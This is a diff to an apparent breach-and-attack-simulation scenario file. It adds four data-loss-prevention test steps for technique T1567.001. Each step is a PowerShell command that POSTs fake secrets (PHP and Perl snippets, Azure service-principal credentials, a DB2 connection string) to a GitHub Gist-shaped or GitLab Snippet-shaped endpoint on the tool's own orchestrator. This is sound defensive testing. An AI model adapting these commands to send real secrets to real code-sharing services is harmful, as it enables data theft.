@@ -127,3 +127,173 @@ steps:
       # See the GitHub step above for why this step's graded verdict
       # never comes from this script's own success/failure.
     cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — PHP Source Code over GitHub Gist shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — GitHub Gist-Compatible Exfiltration of PHP Source Code (T1567.001)"
+    technique_id: T1567.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs synthetic PHP-source-code-shaped content (embedded fake secret) to the platform's own GitHub-Gist-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitHub API request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: GitHub-Gist-API-shaped HTTPS POST (path, Authorization header, JSON body) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "<?php // [BAS-SIM-DLP]`n`$db_password = `"BAS-SIM-DLP-Placeholder9`"; ?>"
+      $token = "{{SINK_TOKEN}}"
+      $files = @{ "$token.dat" = @{ content = $payload } }
+      $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
+          -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
+          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: github_gist_result=success"
+        Write-Output "EXEC T1567.001: PHP-source-code-shaped GitHub Gist traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: github_gist_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
+      }
+      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
+      # graded verdict comes entirely from whether the code-repository
+      # sink actually received a request with a matching token, resolved
+      # server-side by internal/webhooksink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — Perl Source Code over GitHub Gist shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — GitHub Gist-Compatible Exfiltration of Perl Source Code (T1567.001)"
+    technique_id: T1567.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs synthetic Perl-source-code-shaped content (embedded fake secret) to the platform's own GitHub-Gist-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitHub API request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: GitHub-Gist-API-shaped HTTPS POST (path, Authorization header, JSON body) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "# [BAS-SIM-DLP]`nmy `$secret = `"BAS-SIM-DLP-Placeholder10`"; # test fixture"
+      $token = "{{SINK_TOKEN}}"
+      $files = @{ "$token.dat" = @{ content = $payload } }
+      $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
+          -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
+          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: github_gist_result=success"
+        Write-Output "EXEC T1567.001: Perl-source-code-shaped GitHub Gist traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: github_gist_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.001: GitHub Gist-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITHUB]"
+      }
+      # DLP_OBSERVATION lines are diagnostic evidence only -- this step's
+      # graded verdict comes entirely from whether the code-repository
+      # sink actually received a request with a matching token, resolved
+      # server-side by internal/webhooksink + internal/verifysync +
+      # internal/reporting's sink-primary dlpVerifier, never from this
+      # script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — Azure Cloud Credentials over GitLab Snippet shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — GitLab Snippet-Compatible Exfiltration of Azure Cloud Credentials (T1567.001)"
+    technique_id: T1567.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic Azure-credential-shaped snippet to the platform's own GitLab-Snippet-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitLab API request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: GitLab-Snippet-API-shaped HTTPS POST (path, PRIVATE-TOKEN header, JSON body) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "{`"appId`":`"00000000-1111-0000-0000-000000000000`",`"displayName`":`"BAS-SIM-DLP-ServicePrincipal`",`"password`":`"df111111-0000-0000-0000-100000000000`",`"tenant`":`"11111111-0000-0000-0000-000000000000`"}"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
+          -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
+          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: gitlab_snippet_result=success"
+        Write-Output "EXEC T1567.001: Azure-credential-shaped GitLab Snippet traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: gitlab_snippet_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
+      }
+      # See the GitHub step above for why this step's graded verdict
+      # never comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — DB2 Connection String over GitLab Snippet shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — GitLab Snippet-Compatible Exfiltration of DB2 Connection String (T1567.001)"
+    technique_id: T1567.001
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic DB2-connection-string-shaped snippet to the platform's own GitLab-Snippet-API-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only, not an authenticated GitLab API request."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: GitLab-Snippet-API-shaped HTTPS POST (path, PRIVATE-TOKEN header, JSON body) content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "DATABASE=BASSIMDLP;HOSTNAME=bas-sim-db2;PORT=50000;PROTOCOL=TCPIP;UID=bas_sim_user;PWD=BAS-SIM-DLP-Placeholder5;"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body `
+          -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
+          -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: gitlab_snippet_result=success"
+        Write-Output "EXEC T1567.001: DB2-connection-string-shaped GitLab Snippet traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: gitlab_snippet_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.001: GitLab Snippet-compatible traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-CODEREPO-GITLAB]"
+      }
+      # See the GitHub step above for why this step's graded verdict
+      # never comes from this script's own success/failure.
+    cleanup: ""
